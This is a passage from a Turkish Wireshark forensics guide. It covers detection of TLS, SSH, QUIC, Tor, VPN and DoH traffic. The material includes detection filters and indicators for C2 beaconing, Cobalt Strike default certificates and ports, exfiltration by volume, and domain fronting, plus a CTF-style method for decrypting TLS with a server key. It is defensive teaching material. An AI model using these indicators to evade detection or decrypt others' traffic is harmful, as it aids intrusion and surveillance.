
**Senden istenen:** CTF: "Sunucunun private key'i verildi, trafiği çöz."

**Filtreler (araştırma yolu):**

- `tls.handshake.ciphersuite == 0x002f || tls.handshake.ciphersuite == 0x0035` → RSA anahtar değişimli şifre takımları (TLS_RSA_WITH_AES_*)
- `tls.handshake.type == 16` → Client Key Exchange (RSA ile şifrelenmiş pre-master secret burada)

**Menü / araç:**

- Edit ▸ Preferences ▸ Protocols ▸ TLS ▸ RSA keys list ▸ Edit → IP, port, protokol (http), key dosyası (.pem/.key)

**Filtreden sonra yol tarifi:**

1. Önce Server Hello'daki şifre takımına bak. "TLS_RSA_WITH_..." ise RSA anahtarıyla çözülebilir.
2. "ECDHE" veya "DHE" içeriyorsa (Perfect Forward Secrecy) private key ile çözülemez; keylog gerekir.
3. TLS 1.3 her zaman PFS kullanır; private key ile asla çözülmez.
4. Key'i ekle, ardından tls && http filtresiyle çözülmüş trafiği gör.

**Terimler:**

- **Private key**: Sunucunun gizli anahtarı.
- **PFS (Perfect Forward Secrecy)**: Her oturum için geçici anahtar; ana anahtar çalınsa bile geçmiş trafik çözülemez.
- **ECDHE**: PFS sağlayan anahtar değişim yöntemi.

> **Anlık karar:** Private key verildiyse önce şifre takımını kontrol et. ECDHE görüyorsan o key bir tuzaktır, keylog ara.


</details>

<details>
<summary><strong>130 · Sertifika bilgilerini incelemek (kime verilmiş?)</strong></summary>

**Metafor:** Bir resmî belgenin üzerindeki mühür ve imza. Kim vermiş, kime vermiş, ne zamana kadar geçerli.

**Senden istenen:** "Sunucu sertifikasının Common Name'i nedir, kim imzalamış?"

**Filtreler (araştırma yolu):**

- `tls.handshake.type == 11` → sertifika içeren paketler (TLS 1.2 ve öncesi)
- `x509sat.uTF8String contains "kotu" || x509sat.printableString contains "kotu"` → sertifika ad alanlarında arama
- `x509ce.dNSName` → Subject Alternative Name (sertifikanın geçerli olduğu alan adları)
- `x509af.serialNumber` → seri numarası (IOC olarak kullanılabilir)

**Filtreden sonra yol tarifi:**

1. Certificate paketini seç, detayda Certificate ▸ signedCertificate ▸ subject ve issuer kısımlarını aç.
2. Subject: sertifikanın kime verildiği (CN = Common Name). Issuer: kim imzaladı (CA).
3. Validity: notBefore / notAfter tarihleri. Çok yeni veya çok kısa süreli sertifikalar dikkat çeker.
4. SAN (dNSName) listesine bak; SNI ile uyuşuyor mu?
5. Sertifikayı dışa aktarmak için sertifika satırına sağ tık ▸ Export Packet Bytes (.der) yapıp openssl ile inceleyebilirsin.

**Terimler:**

- **X.509**: Dijital sertifika standardı.
- **CA**: Certificate Authority; sertifikaları imzalayan güvenilir kurum.
- **Common Name (CN) / SAN**: Sertifikadaki alan adı alanları.

> **Anlık karar:** TLS 1.3'te sertifikayı göremezsin. Bu durumda sertifika bilgisi için aynı sunucuya yapılmış eski bir TLS 1.2 bağlantısı veya istihbarat kaynakları gerekir.


</details>

<details>
<summary><strong>131 · Self-signed ve şüpheli sertifika tespiti</strong></summary>

**Metafor:** Kendi el yazısıyla "Ben polisim" yazıp imzalayan biri. Resmî kurum onaylamamış.

**Senden istenen:** "C2 sunucusu kendinden imzalı sertifika mı kullanıyor?"

**Filtreler (araştırma yolu):**

- `tls.handshake.type == 11 && x509sat.printableString == "XX"` → varsayılan ülke "XX" (OpenSSL'in boş bırakılmış değeri)
- `x509sat.uTF8String == "Internet Widgits Pty Ltd" || x509sat.printableString == "Internet Widgits Pty Ltd"` → OpenSSL varsayılan organizasyon adı
- `x509sat.printableString == "Some-State" || x509sat.uTF8String == "Some-State"` → OpenSSL varsayılan eyalet
- `tls.alert_message.desc == 48` → Unknown CA uyarısı (istemci sertifikayı tanımadı)

**Filtreden sonra yol tarifi:**

1. Sertifikada Subject ve Issuer aynıysa kendinden imzalıdır.
2. OpenSSL varsayılan değerleri (Internet Widgits Pty Ltd, Some-State, XX) aceleyle üretilmiş sertifika demektir; zararlı altyapıda çok görülür.
3. Cobalt Strike, Metasploit gibi araçların varsayılan sertifikalarını tanı (ör. CS varsayılanında seri numarası 146473198 ve rastgele CN; Problem 177).
4. İstemcinin Unknown CA uyarısı gönderdiğine bak; normal tarayıcı hata verir, zararlı ise sertifika doğrulamadan devam eder.

**Terimler:**

- **Self-signed**: Kendi kendini imzalayan, CA onayı olmayan sertifika.
- **TLS Alert 48**: "unknown_ca"; sertifikayı imzalayan otorite tanınmıyor.

> **Anlık karar:** Uyarıya rağmen veri akmaya devam ediyorsa istemci bir tarayıcı değil, sertifika doğrulamayan bir programdır.


</details>

<details>
<summary><strong>132 · JA3/JA4 parmak izi ile zararlı istemci tespiti</strong></summary>

**Metafor:** Herkes aynı kilitli zarfı kullanır ama her kişinin zarfı katlama biçimi farklıdır. JA3/JA4 bu katlama biçiminin parmak izidir.

**Senden istenen:** "Bu TLS bağlantısını hangi program yaptı? Bilinen zararlı imzası var mı?"

**Filtreler (araştırma yolu):**

- `tls.handshake.ja3` → Client Hello'nun JA3 hash'i
- `tls.handshake.ja3 == "72a589da586844d7f0818ce684948eea"` → belirli bir JA3 değeri (örnek)
- `tls.handshake.ja4` → Wireshark 4.2+ ile gelen JA4 parmak izi
- `tls.handshake.ja3s` → sunucu tarafı parmak izi (JA3S)

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'tls.handshake.type == 1' -T fields -e ip.src -e tls.handshake.extensions_server_name -e tls.handshake.ja3 | sort | uniq -c
```

**Filtreden sonra yol tarifi:**

1. JA3/JA4 alanlarını sütun olarak ekle.
2. Her iç host için kullanılan JA3 değerlerini listele. Tarayıcının JA3'ü sık, zararlının JA3'ü nadir görülür.
3. Nadir JA3'leri istihbarat kaynaklarında ara (ja3er, abuse.ch SSLBL, Threat intel).
4. JA3 + JA3S ikilisi daha güçlü imzadır: aynı istemci + aynı sunucu yazılımı.
5. JA4 daha yeni ve okunabilir formattır (t13d1516h2_... gibi); sürüm, şifre sayısı, ALPN gibi bilgileri doğrudan gösterir.

**Terimler:**

- **JA3**: Client Hello'daki sürüm, şifre takımları, uzantılar vb. alanlardan hesaplanan MD5 parmak izi.
- **JA4**: JA3'ün yeni nesli; daha okunabilir ve TLS 1.3 uzantı sırasından etkilenmez.
- **JA3S**: Sunucunun Server Hello'sunun parmak izi.

> **Anlık karar:** JA3 tek başına karar vermez (aynı kütüphaneyi kullanan masum programlar aynı JA3'ü üretir). Nadirlik + hedef + zamanlama ile birleştir.


</details>

<details>
<summary><strong>133 · TLS üzerinden C2 beaconing</strong></summary>

**Metafor:** Her 60 saniyede bir kapıyı tıklatıp "emir var mı?" diye soran biri. Mektup kilitli ama ritim ortada.

**Senden istenen:** "Şifreli trafikte periyodik C2 iletişimi var mı?"

**Filtreler (araştırma yolu):**

- `tls.handshake.type == 1 && ip.dst == 203.0.113.50` → şüpheli sunucuya her yeni bağlantı
- `ip.addr == 203.0.113.50 && tls.record.content_type == 23` → o sunucuyla uygulama verisi
- `tls.handshake.extensions_server_name == "cdn-guncelleme.com"` → belirli SNI'ye giden bağlantılar

**Menü / araç:**

- Statistics ▸ Conversations ▸ TCP → aynı hedefe çok sayıda benzer boyutlu akış
- Statistics ▸ I/O Graphs → şüpheli hedef için 1 saniyelik aralıkta testere dişi deseni

**Filtreden sonra yol tarifi:**

1. Aynı hedefe giden Client Hello'ları filtrele ve frame.time_delta_displayed sütunu ekle (ardışık filtrelenmiş paketler arası süre).
2. Süreler neredeyse sabitse (60, 61, 59, 60...) beacon'dır. Küçük sapma (jitter) yapay zekâyla değil ayarla eklenir.
3. Akış boyutlarını karşılaştır; komut yokken her beacon neredeyse aynı boyuttadır. Farklı büyüklükteki akış = komut geldi veya veri gitti.
4. SNI, sertifika ve JA3 ile altyapıyı tanımla.

**Terimler:**

- **Beacon**: Zararlının periyodik "hâlâ buradayım, emir var mı?" bağlantısı.
- **Jitter**: Tespitten kaçmak için aralıklara eklenen rastgele sapma.
- **frame.time_delta_displayed**: Ekranda görünen bir önceki pakete göre geçen süre.

> **Anlık karar:** İnsan düzensizdir, makine düzenlidir. Gece 3'te dakikada bir aynı yere giden şifreli bağlantı insan değildir.


</details>

<details>
<summary><strong>134 · Eski/zayıf TLS sürümü ve şifre takımı (downgrade)</strong></summary>

**Metafor:** Güçlü kilit yerine eski asma kilidi kullanmaya zorlamak.

**Senden istenen:** "Zayıf şifreleme kullanılmış mı?", "Downgrade saldırısı var mı?"

**Filtreler (araştırma yolu):**

- `tls.handshake.type == 2 && tls.handshake.version <= 0x0302` → sunucunun TLS 1.1 veya altını seçtiği el sıkışmalar
- `tls.handshake.extensions.supported_version == 0x0304` → TLS 1.3 destekleyen/seçen
- `tls.handshake.ciphersuite in {0x0004, 0x0005, 0x000a}` → RC4 ve 3DES takımları (zayıf)
- `ssl.record.version == 0x0300 || tls.record.version == 0x0300` → SSLv3 (POODLE dönemi)

**Filtreden sonra yol tarifi:**

1. Server Hello'ları filtrele ve seçilen sürümü ve şifre takımını sütun yap.
2. Client Hello'da yüksek sürüm önerildiği halde Server Hello'da düşük sürüm seçiliyorsa ve sunucu normalde modern ise araya giren biri olabilir.
3. TLS_FALLBACK_SCSV (0x5600) şifre takımı istemci tarafında görülüyorsa istemci downgrade'e karşı koruma kullanıyordur.
4. Zayıf takım kullanımı saldırı değil zafiyettir; raporda ayrı başlıkta yaz.

**Terimler:**

- **Downgrade attack**: Tarafları daha zayıf bir protokol sürümüne geçmeye zorlama.
- **RC4 / 3DES**: Artık kırılabilir kabul edilen eski şifreleme algoritmaları.
- **0x0303 / 0x0304**: TLS 1.2 / TLS 1.3 sürüm kodları (0x0301 TLS 1.0, 0x0302 TLS 1.1).

> **Anlık karar:** Sürüm kodlarını ezberle: 0300 SSL3, 0301 TLS1.0, 0302 TLS1.1, 0303 TLS1.2, 0304 TLS1.3.


</details>

<details>
<summary><strong>135 · SNI olmayan veya doğrudan IP'ye yapılan TLS bağlantıları</strong></summary>

**Metafor:** Alıcı adı yazılmamış kilitli zarf. Meşru gönderenler neredeyse her zaman adı yazar.

**Senden istenen:** "Hangi TLS bağlantıları alan adı kullanmadan doğrudan IP'ye yapılmış?"

**Filtreler (araştırma yolu):**

- `tls.handshake.type == 1 && !tls.handshake.extensions_server_name` → SNI'siz Client Hello'lar
- `tls.handshake.extensions_server_name matches "^[0-9.]+$"` → SNI alanına IP yazılmış
- `tls.handshake.type == 1 && !(tls.handshake.extensions_server_name) && !(ip.dst == 10.0.0.0/8)` → dış IP'lere SNI'siz bağlantılar

**Filtreden sonra yol tarifi:**

1. SNI'siz Client Hello'ları filtrele.
2. Hedef IP'ler için önceki DNS sorgusu var mı kontrol et (dns.a == IP). Yoksa IP sabit kodlanmıştır.
3. Meşru istisnaları ayır (bazı eski uygulamalar, VPN'ler, IoT cihazları).
4. Kalanlar zararlı C2 adayıdır: JA3, sertifika ve zamanlama analizine geç.

**Terimler:**

- **Hardcoded IP**: Programın içine gömülü, DNS kullanılmadan bağlanılan adres.

> **Anlık karar:** DNS'siz + SNI'siz + dış IP + düzenli aralık = C2 olasılığı çok yüksek.


</details>

<details>
<summary><strong>136 · Standart dışı portta TLS</strong></summary>

**Metafor:** Resmî postane yerine arka sokaktaki bir kapıdan kilitli zarf teslim etmek.

**Senden istenen:** "443 dışındaki portlarda şifreli trafik var mı?"

**Filtreler (araştırma yolu):**

- `tls && !(tcp.port == 443) && !(tcp.port == 993) && !(tcp.port == 995) && !(tcp.port == 465) && !(tcp.port == 636) && !(tcp.port == 853) && !(tcp.port == 8443)` → bilinen TLS portları dışındaki TLS
- `tcp.payload[0:3] == 16:03:01 && !tls` → TLS gibi başlayan ama tanınmamış (Decode As gereken) trafik

**Filtreden sonra yol tarifi:**

1. Bilinen TLS portlarını dışarıda bırakıp kalan TLS trafiğini listele.
2. Wireshark standart dışı portta TLS'yi her zaman tanımaz; payload'ı 16 03 01/03 ile başlayan akışları Decode As ▸ TLS ile çöz (Problem 017).
3. Port, SNI ve sertifikayı değerlendir; 4444, 8080, 50050 gibi portlarda TLS sıkça C2'dir (50050 Cobalt Strike team server varsayılanı).
4. Bulguyu port-protokol uyumsuzluğu olarak raporla (Problem 067).

**Terimler:**

- **16 03 01**: TLS kaydının ilk byte'ları (16 = handshake, 03 01 = sürüm).
- **Team server**: Cobalt Strike'ın operatör sunucusu.

> **Anlık karar:** Payload 16 03 ile başlıyorsa protokol TLS'tir, port ne derse desin.


</details>

<details>
<summary><strong>137 · TLS alert'leri ve başarısız el sıkışmalar</strong></summary>

**Metafor:** Görüşme başlamadan diplomatlardan birinin "bu kimliği tanımıyorum" deyip masadan kalkması.

**Senden istenen:** "TLS bağlantısı neden kurulamadı?", "İstemci sertifikayı reddetti mi?"

**Filtreler (araştırma yolu):**

- `tls.alert_message` → tüm TLS uyarıları
- `tls.alert_message.level == 2` → Fatal (ölümcül) uyarılar
- `tls.alert_message.desc == 42 || tls.alert_message.desc == 46` → bad_certificate / certificate_unknown
- `tls.alert_message.desc == 40` → handshake_failure (ortak şifre takımı yok)

**Filtreden sonra yol tarifi:**

1. Alert paketlerini filtrele ve "Description" alanını oku.
2. Sertifika hataları (42, 46, 48) MITM proxy'ye (ör. Burp, kurumsal SSL inspection) veya sahte sertifikaya işaret edebilir.
3. Handshake failure ise istemci ve sunucunun ortak sürüm/şifre takımı yoktur.
4. Şifreli alert (TLS 1.3'te el sıkışma sonrası) normal kapanış (close_notify) olabilir; seviyesi okunamıyorsa abartma.

**Terimler:**

- **TLS Alert**: TLS'in uyarı/hata mesajı.
- **close_notify (0)**: Normal "kapatıyorum" bildirimi.
- **SSL inspection**: Kurumsal cihazın TLS'i açıp tekrar şifrelemesi (meşru MITM).

> **Anlık karar:** Uyarı sonrası bağlantı devam ediyorsa istemci uyarıyı umursamamıştır. Bu bir program davranışıdır.


</details>

<details>
<summary><strong>138 · Sertifika zinciri ve son kullanma tarihi</strong></summary>

**Metafor:** Pasaportun geçerlilik tarihi ve hangi devletin onayladığı.

**Senden istenen:** "Sertifika ne zaman oluşturulmuş, ne zaman bitiyor? Zincirde kimler var?"

**Filtreler (araştırma yolu):**

- `x509af.notBefore` → geçerlilik başlangıcı (alan seçilince detay görünür)
- `x509af.notAfter` → geçerlilik bitişi
- `tls.handshake.certificates` → sertifika zinciri

**Filtreden sonra yol tarifi:**

1. Certificate mesajını aç; birden fazla sertifika varsa ilk sunucunun, sonrakiler ara CA'lardır.
2. notBefore tarihine bak: olaydan birkaç gün önce oluşturulmuş sertifika saldırı hazırlığına işaret eder.
3. Süresi geçmiş sertifikayla bağlantı devam ediyorsa istemci doğrulama yapmıyordur.
4. Zincirde tek sertifika varsa ve Issuer = Subject ise self-signed'dır (Problem 131).

**Terimler:**

- **Certificate chain**: Sunucu sertifikasından kök CA'ya kadar imza zinciri.
- **Intermediate CA**: Kök ile sunucu arasındaki ara imzacı.

> **Anlık karar:** "Sertifika ne zaman alınmış?" sorusu altyapının yaşını söyler. Yeni altyapı + bilinmeyen alan = şüphe.


</details>

<details>
<summary><strong>139 · Ücretsiz sertifikalı yeni alan adları (Let's Encrypt vb.)</strong></summary>

**Metafor:** Dün açılmış, tabelası henüz kurumamış bir dükkân. Yeni olması suç değil ama dikkat ister.

**Senden istenen:** "Zararlı altyapı ücretsiz otomatik sertifika mı kullanıyor?"

**Filtreler (araştırma yolu):**

- `x509sat.printableString == "Let's Encrypt" || x509sat.uTF8String == "Let's Encrypt"` → Let's Encrypt imzalı sertifikalar
- `x509sat.printableString contains "ZeroSSL" || x509sat.uTF8String contains "ZeroSSL"` → başka ücretsiz CA

**Filtreden sonra yol tarifi:**

1. Let's Encrypt imzalı sertifikaları listele (çok yaygındır, tek başına anlamsız).
2. Bunları "bilinmeyen alan + kısa süredir var + beacon davranışı" ile kesiştir.
3. Sertifika şeffaflık kayıtlarında (crt.sh) alanın ilk sertifika tarihine bakılabilir (analiz ortamı dışından).
4. Phishing alanları sıklıkla ücretsiz sertifika kullanır; SNI'de marka taklidi var mı bak (Problem 090).

**Terimler:**

- **Let's Encrypt**: Ücretsiz, otomatik sertifika veren CA.
- **Certificate Transparency**: Verilen tüm sertifikaların herkese açık kaydı.

> **Anlık karar:** Ücretsiz sertifika = normal. Ücretsiz sertifika + taklit alan adı + yeni kayıt = oltalama.


</details>

<details>
<summary><strong>140 · QUIC (HTTP/3) trafiğini tanımak</strong></summary>

**Metafor:** Mektupları TCP posta servisi yerine UDP kuryeyle göndermek; daha hızlı, ama kurallar farklı.

**Senden istenen:** "UDP 443'teki bu trafik ne?", "QUIC'te hangi alana bağlanıldı?"

**Filtreler (araştırma yolu):**

- `quic` → QUIC paketleri
- `udp.port == 443` → QUIC'in varsayılan portu
- `quic.long.packet_type == 0` → Initial paketleri (SNI burada, Wireshark çözebilir)
- `quic && tls.handshake.extensions_server_name` → QUIC Initial içindeki SNI

**Filtreden sonra yol tarifi:**

1. UDP 443'ü filtrele; Wireshark genelde otomatik QUIC olarak çözer.
2. Initial paketleri herkesin çözebileceği anahtarlarla korunur; Wireshark bunları açıp içindeki TLS Client Hello'yu ve SNI'yi gösterir.
3. SNI ile alan adını bul; geri kalan trafik keylog olmadan çözülemez (Chrome'un SSLKEYLOGFILE'ı QUIC için de çalışır).
4. Bazı kurumlar QUIC'i engelleyip tarayıcıyı TCP'ye düşürür; QUIC görmen bu kontrolün olmadığını gösterir.

**Terimler:**

- **QUIC**: UDP üzerinde çalışan, TLS 1.3'ü içine gömmüş yeni taşıma protokolü.
- **HTTP/3**: QUIC üzerinde çalışan HTTP sürümü.
- **Initial packet**: QUIC bağlantısının ilk paketi; Client Hello taşır.

> **Anlık karar:** "UDP 443 = QUIC" refleksi. SNI'yi Initial paketinden oku.


</details>

<details>
<summary><strong>141 · ECH/ESNI: SNI'nin gizlendiği durumlar</strong></summary>

**Metafor:** Zarfın üstündeki alıcı adının da kapalı bir iç zarfa konması; dışarıda sadece "postane" yazar.

**Senden istenen:** "SNI neden ortak bir ad (ör. cloudflare-ech.com) gösteriyor?"

**Filtreler (araştırma yolu):**

- `tls.handshake.extension.type == 65037` → Encrypted Client Hello (ECH) uzantısı (0xfe0d)
- `tls.handshake.extensions_server_name == "cloudflare-ech.com"` → Cloudflare'ın dış (public) ECH adı

**Filtreden sonra yol tarifi:**

1. ECH uzantısını filtrele; varsa dış SNI gerçek hedefi göstermez.
2. Gerçek hedefi bulmak için önceki DNS sorgularına (HTTPS/SVCB kayıtları, type 65) ve IP'ye bak.
3. DNS de şifreliyse (DoH) ağ tarafında hedef görünmez; uç nokta (EDR, tarayıcı geçmişi) kanıtı gerekir.
4. Bulgu olarak "görünürlük kısıtı" yaz; analiz sınırını raporda belirtmek profesyonelliktir.

**Terimler:**

- **ECH**: Encrypted Client Hello; SNI dahil Client Hello'nun şifrelendiği yeni standart.
- **HTTPS/SVCB kaydı**: ECH yapılandırmasını taşıyan yeni DNS kayıt türü.

> **Anlık karar:** Her şeyi ağdan göremezsin. Görmediğini "yok" diye yazma, "görünmüyor" diye yaz.


</details>

<details>
<summary><strong>142 · SSH trafiği analizi (sürüm, brute force, oturum)</strong></summary>

**Metafor:** Kilitli bir telefon görüşmesi. Ne konuşulduğunu duymazsın ama kimin aradığını, kaç kez denediğini ve ne kadar konuştuğunu görürsün.

**Senden istenen:** "SSH sunucusu/istemci sürümü ne?", "Brute force var mı?", "Hangi oturum başarılı?"

**Filtreler (araştırma yolu):**

- `ssh.protocol` → sürüm satırları (SSH-2.0-OpenSSH_8.9p1)
- `ssh.protocol contains "libssh" || ssh.protocol contains "paramiko" || ssh.protocol contains "Go"` → betik/araç istemcileri
- `ssh.kex.hassh` → istemci parmak izi (HASSH, JA3'ün SSH karşılığı)
- `ssh.message_code == 20` → Key Exchange Init

**Filtreden sonra yol tarifi:**

1. ssh.protocol filtresiyle istemci ve sunucu sürümlerini oku; istemci sürümü aracı ele verir (ör. "SSH-2.0-libssh2", "SSH-2.0-paramiko").
2. Conversations ▸ TCP'de port 22 akışlarının sayısını ve boyutunu incele: çok sayıda benzer küçük akış = brute force.
3. Başarılı oturum genelde çok daha uzun ve büyüktür; özellikle sunucudan istemciye çok sayıda paket varsa etkileşimli shell vardır.
4. HASSH değerini istihbaratla karşılaştır.

**Terimler:**

- **SSH**: Güvenli uzaktan komut satırı protokolü.
- **HASSH**: SSH istemcisinin anahtar değişim tercihlerinin parmak izi.
- **Key exchange**: Oturum anahtarının güvenle üretildiği aşama.

> **Anlık karar:** SSH'de başarı kararını boyutla ver: tüm akışlar ~2-4 KB iken bir akış 50 KB ve dakikalarca sürüyorsa o oturum açılmıştır.


</details>

<details>
<summary><strong>143 · SSH tünelleme ve port forwarding şüphesi</strong></summary>

**Metafor:** Kilitli bir telefon hattının içinden ikinci bir gizli görüşme yürütmek.

**Senden istenen:** "SSH oturumu sadece komut için mi, yoksa tünel olarak mı kullanılmış?"

**Filtreler (araştırma yolu):**

- `tcp.port == 22 && tcp.len > 1000` → SSH'de büyük veri paketleri
- `ssh && ip.src == 10.0.0.20 && !(ip.dst == 10.0.0.0/8)` → iç hosttan dış SSH sunucusuna bağlantı

**Filtreden sonra yol tarifi:**

1. SSH oturumunun veri hacmine ve süresine bak. Etkileşimli komut oturumu küçük ve düzensiz paketler üretir; tünel büyük, sürekli veya HTTP/RDP benzeri desenler üretir.
2. İç hosttan dışarıya SSH genelde politika dışıdır; reverse tunnel (ssh -R) ile iç ağı dışarı açma girişimi olabilir.
3. SSH oturumuyla aynı anda kurbanda başka protokol trafiğinin azalması/kaybolması tünele işaret edebilir.
4. Bulguyu "şifreli tünel, içerik görünmüyor" olarak belgeleyip uç nokta analizi öner.

**Terimler:**

- **Port forwarding**: SSH bağlantısı üzerinden başka bir portun trafiğini taşıma.
- **Reverse tunnel**: İçerideki makinenin dışarıya bağlanıp dışarıdan içeri yol açması.

> **Anlık karar:** İçeriden dışarı uzun ve büyük SSH = ya veri sızdırma ya tünel. İkisi de kritik.


</details>

<details>
<summary><strong>144 · Şifreli trafikte veri sızdırma: hacim analizi</strong></summary>

**Metafor:** Kamyonun kasası kapalı ama kantarda ağırlığı belli. Ne taşıdığını bilmesen de ne kadar taşıdığını bilirsin.

**Senden istenen:** "Şifreli kanaldan veri dışarı çıkarılmış mı, ne kadar?"

**Filtreler (araştırma yolu):**

- `tls.record.content_type == 23 && ip.src == 10.0.0.20 && !(ip.dst == 10.0.0.0/8)` → iç hosttan dışa şifreli veri
- `tcp.stream == 42 && ip.src == 10.0.0.20` → şüpheli akışta giden yön

**Menü / araç:**

- Statistics ▸ Conversations ▸ TCP → "Bytes A→B" büyük ve iç→dış yönündeki akışlar

**Filtreden sonra yol tarifi:**

1. Conversations'ta iç hosttan dışa giden byte miktarına göre sırala.
2. Normal web kullanımında indirilen (B→A) yüklenen (A→B) veriden çok büyüktür; tersine dönmüş oran sızdırma işaretidir.
3. Hedefi değerlendir (SNI): bulut depolama, dosya paylaşım, bilinmeyen alan.
4. I/O Graph ile yüklemenin zamanını ve süresini bul; mesai dışı mı?
5. Byte miktarını raporla ve uç nokta ekibine "bu saatte hangi süreç bu bağlantıyı açtı?" sorusunu ilet.

**Terimler:**

- **Upload/Download oranı**: Gönderilen/alınan veri oranı.
- **Exfiltration**: Veri sızdırma.

> **Anlık karar:** Şifre içeriği gizler, hacmi gizlemez. "Ne kadar, ne zaman, nereye" sorularının üçü de cevaplanabilir.


</details>

<details>
<summary><strong>145 · Tor trafiği tespiti</strong></summary>

**Metafor:** Mektubun üç farklı kuryeden geçerek, her kuryenin sadece bir öncekini ve bir sonrakini bildiği bir zincirle gönderilmesi.

**Senden istenen:** "Kurum ağında Tor kullanımı var mı?"

**Filtreler (araştırma yolu):**

- `tcp.dstport in {9001, 9030, 9050, 9150}` → yaygın Tor portları (ORPort, DirPort, SOCKS)
- `tls.handshake.extensions_server_name matches "^www\\.[a-z0-9]{8,20}\\.(com|net)$"` → Tor'un rastgele ürettiği sahte SNI kalıbı
- `x509sat.uTF8String matches "^www\\.[a-z0-9]{8,20}\\.(net|com)$"` → Tor relay sertifikalarındaki rastgele adlar

**Filtreden sonra yol tarifi:**

1. Bilinen Tor portlarına giden bağlantıları filtrele.
2. 443'teki Tor bağlantıları için SNI ve sertifika adlarında "www.<rastgele>.com" kalıbını ara.
3. Hedef IP'leri herkese açık Tor relay listesiyle karşılaştır (analiz ortamı dışından alınmış liste ile).
4. Tor kullanımı kurum politikasına aykırıdır ve zararlıların C2'si için de kullanılabilir; kaynak makineyi uç noktada incele.

**Terimler:**

- **Tor**: Trafiği birden çok rastgele sunucudan şifreli geçiren anonimlik ağı.
- **Relay / Guard node**: Tor ağındaki aracı sunucular / ilk durak.

> **Anlık karar:** Tor içeriği çözülmez. Hedefin relay listesinde olması tespit için yeterli kanıttır.


</details>

<details>
<summary><strong>146 · VPN protokollerini tanımak (OpenVPN, WireGuard, IPsec)</strong></summary>

**Metafor:** Farklı markalı zırhlı araçlar. Hepsi içini gizler ama markası dışından tanınır.

**Senden istenen:** "Bu şifreli UDP trafiği ne? Yetkisiz VPN var mı?"

**Filtreler (araştırma yolu):**

- `openvpn` → OpenVPN (varsayılan UDP/TCP 1194)
- `wg` → WireGuard (varsayılan UDP 51820)
- `isakmp` → IPsec IKE anahtar değişimi (UDP 500/4500)
- `esp` → IPsec şifreli veri
- `pptp || l2tp` → eski VPN protokolleri

**Filtreden sonra yol tarifi:**

1. Protocol Hierarchy'de VPN protokollerini ara.
2. Wireshark standart portlarda otomatik tanır; farklı portta ise Decode As gerekebilir.
3. VPN uç noktasını (dış IP) ve kullanan iç hostu belirle.
4. Kurumsal VPN mi, kişisel/yetkisiz VPN mi ayır; yetkisiz VPN veri sızdırma ve politika ihlali bulgusudur.

**Terimler:**

- **VPN**: Trafiği şifreli bir tünelle başka bir ağa taşıyan teknoloji.
- **IKE / ESP**: IPsec'in anahtar değişim ve şifreli veri bileşenleri.

> **Anlık karar:** Kurumsal VPN sunucusunun IP'sini bil. Ondan farklı her VPN uç noktası sorgulanır.


</details>

<details>
<summary><strong>147 · TLS session resumption ile oturum takibi</strong></summary>

**Metafor:** Bir otelde ikinci gelişinde kimlik yerine "geçen sefer verdiğiniz kart" ile hızlı giriş yapmak. Kart, iki ziyaretin aynı kişi olduğunu gösterir.

**Senden istenen:** "Farklı zamanlardaki bağlantılar aynı istemciye/oturuma mı ait?"

**Filtreler (araştırma yolu):**

- `tls.handshake.session_ticket` → sunucunun verdiği oturum bileti
- `tls.handshake.extension.type == 35` → istemcinin bilet sunduğu Client Hello (session_ticket uzantısı)
- `tls.handshake.extension.type == 41` → TLS 1.3 pre_shared_key ile yeniden bağlanma
- `tls.handshake.session_id == 4c:2e:9a:00` → belirli session ID (örnek; kendi değerinle değiştir)

**Filtreden sonra yol tarifi:**

1. Session ID veya ticket değerini sütun olarak ekle.
2. Aynı session ID/ticket'ın farklı IP'lerden kullanılması, oturumun başka bir makineye taşındığını gösterebilir.
3. Resumption, sertifika mesajı içermez; sertifika analizi için ilk tam el sıkışmayı bul.
4. Beacon analizinde: ilk bağlantı tam el sıkışma, sonrakiler resumption ise aynı zararlı sürecidir.

**Terimler:**

- **Session resumption**: Önceki TLS oturumunun anahtarlarını yeniden kullanarak hızlı bağlanma.
- **Session ticket**: Sunucunun istemciye verdiği şifreli oturum bilgisi.

> **Anlık karar:** Resumption'lı bağlantıda sertifika göremezsin; "sertifika yok" diye şüphelenmeden önce ilk tam bağlantıyı ara.


</details>

<details>
<summary><strong>148 · Şifreli DNS (DoH) ile TLS bağlantıları arasında korelasyon</strong></summary>

**Metafor:** Kişinin kimi aradığını göremiyorsun ama aradıktan hemen sonra hangi kapıya gittiğini görüyorsun.

**Senden istenen:** "DoH kullanılmış; hangi siteye gidildiğini nasıl çıkarırım?"

**Filtreler (araştırma yolu):**

- `tls.handshake.extensions_server_name in {"dns.google", "cloudflare-dns.com", "mozilla.cloudflare-dns.com"}` → DoH bağlantıları
- `tls.handshake.type == 1 && !(tls.handshake.extensions_server_name in {"dns.google", "cloudflare-dns.com"})` → DoH dışındaki TLS bağlantıları

**Filtreden sonra yol tarifi:**

1. DoH sunucusuna giden şifreli istek zamanlarını not et.
2. Her DoH isteğinden hemen sonra (milisaniyeler içinde) açılan yeni TLS bağlantısının SNI'sini oku; çözülen alan büyük ihtimalle odur.
3. SNI de ECH ile gizliyse hedef IP'yi kaydet; IP'nin barındırdığı servisi istihbaratla bul.
4. Korelasyonu "yüksek olasılık" diye raporla, kesin değil.

**Terimler:**

- **Korelasyon**: İki olay arasında zamana veya içeriğe dayalı ilişki kurma.
- **Inference**: Doğrudan görmeden mantıkla çıkarım yapma.

> **Anlık karar:** Çıkarımı kanıt gibi yazma. "DoH isteğinden 20 ms sonra X'e bağlantı açıldı" de, "X'i çözdü" deme.


</details>

<details>
<summary><strong>149 · Domain fronting şüphesi</strong></summary>

**Metafor:** Zarfın üstüne "Banka Genel Müdürlüğü" yazıp içine "kat 3'teki sahte ofise ilet" notu koymak. Bekçi zarfı okur, içerideki not başka yere gider.

**Senden istenen:** "SNI ile HTTP Host başlığı farklı mı?"

**Filtreler (araştırma yolu):**

- `tls.handshake.extensions_server_name contains "cloudfront.net" || tls.handshake.extensions_server_name contains "azureedge.net" || tls.handshake.extensions_server_name contains "fastly"` → fronting'e açık CDN'ler
- `http.host && tls` → (TLS çözüldükten sonra) TLS içindeki HTTP Host başlıkları

**Filtreden sonra yol tarifi:**

1. Bu teknik ancak TLS çözülebilirse kesin tespit edilir: SNI'deki ad ile çözülmüş HTTP Host başlığı farklıysa fronting'dir.
2. Çözülemiyorsa SNI'de meşru büyük CDN, ama beacon davranışı ve nadir JA3 birleşiyorsa şüphe olarak not et.
3. Birçok CDN bu tekniği artık engeller; görülürse hedeflenmiş/gelişmiş bir aktör olabilir.

**Terimler:**

